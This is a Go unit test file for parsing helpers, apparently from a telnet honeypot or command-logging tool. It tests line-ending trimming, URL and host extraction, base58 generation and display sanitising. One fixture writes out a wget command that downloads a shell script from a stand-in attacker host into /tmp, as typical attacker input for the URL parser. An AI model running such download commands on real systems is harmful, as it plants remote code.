package util

import (
	"strings"
	"testing"
)

func TestTrimCRLF(t *testing.T) {
	cases := map[string]string{
		"hello\r\n": "hello",
		"hello\n":   "hello",
		"hello":     "hello",
		"root\x00":  "root", // CR-NUL telnet line ending
		"":          "",
	}
	for in, want := range cases {
		if got := TrimCRLF(in); got != want {
			t.Errorf("TrimCRLF(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestExtractURLAndHost(t *testing.T) {
	parts := []string{"wget", "-q", "http://evil.example.com:8080/x.sh", "-O", "/tmp/x"}
	url := ExtractURL(parts)
	if url != "http://evil.example.com:8080/x.sh" {
		t.Fatalf("ExtractURL = %q", url)
	}
	if h := ExtractHost(url); h != "evil.example.com:8080" {
		t.Fatalf("ExtractHost = %q", h)
	}
	if got := ExtractHost("https://user:pass@host.tld/p"); got != "host.tld" {
		t.Fatalf("ExtractHost userinfo = %q", got)
	}
	if ExtractURL([]string{"ls", "-la"}) != "" {
		t.Fatal("expected empty url")
	}
}

func TestBase58Gen(t *testing.T) {
	const n = 32
	s := Base58Gen(n)
	if len(s) != n {
		t.Fatalf("len = %d, want %d", len(s), n)
	}
	for _, r := range s {
		if !strings.ContainsRune(base58Alphabet, r) {
			t.Fatalf("char %q not in base58 alphabet", r)
		}
	}
	if Base58Gen(n) == s {
		t.Fatal("two random generations collided")
	}
}

func TestSliceContains(t *testing.T) {
	if !SliceContains([]string{"a", "b"}, "b") {
		t.Fatal("want true")
	}
	if SliceContains([]string{"a"}, "z") {
		t.Fatal("want false")
	}
}

func TestHostOnly(t *testing.T) {
	if got := HostOnly("1.2.3.4:51234"); got != "1.2.3.4" {
		t.Fatalf("HostOnly = %q", got)
	}
	if got := HostOnly("noport"); got != "noport" {
		t.Fatalf("HostOnly noport = %q", got)
	}
}

func TestSanitizeDisplay(t *testing.T) {
	if got := SanitizeDisplay("a\tb\x00c\x7f"); got != "a b.c." {
		t.Fatalf("SanitizeDisplay = %q", got)
	}
}
